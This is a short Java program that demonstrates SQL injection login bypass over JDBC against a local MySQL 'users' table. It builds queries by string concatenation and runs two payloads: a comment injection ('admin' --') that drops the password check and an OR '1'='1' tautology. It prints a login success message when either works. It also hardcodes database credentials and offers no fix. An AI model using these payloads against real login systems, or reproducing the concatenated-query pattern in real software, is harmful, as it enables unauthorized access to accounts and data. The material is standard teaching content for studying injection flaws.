// Login Bypass SQL Injection via JDBC
// Attacker injects a tautology or comment to bypass username/password checks.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class login_bypass_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE login: username = 'admin' -- , password ignored via comment
        String user = "admin' -- ";
        String pass = "anything";
        String query = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "'";

        ResultSet rs = st.executeQuery(query);
        if (rs.next()) {
            System.out.println("LOGIN SUCCESS (password check commented out) as " + rs.getString("username"));
        } else {
            System.out.println("Login failed");
        }

        // OR-based bypass: username = ' OR '1'='1, password = ' OR '1'='1
        String q2 = "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'";
        ResultSet rs2 = st.executeQuery(q2);
        if (rs2.next()) {
            System.out.println("LOGIN SUCCESS (tautology bypass) as " + rs2.getString("username"));
        }

        rs.close();
        rs2.close();
        st.close();
        con.close();
    }
}
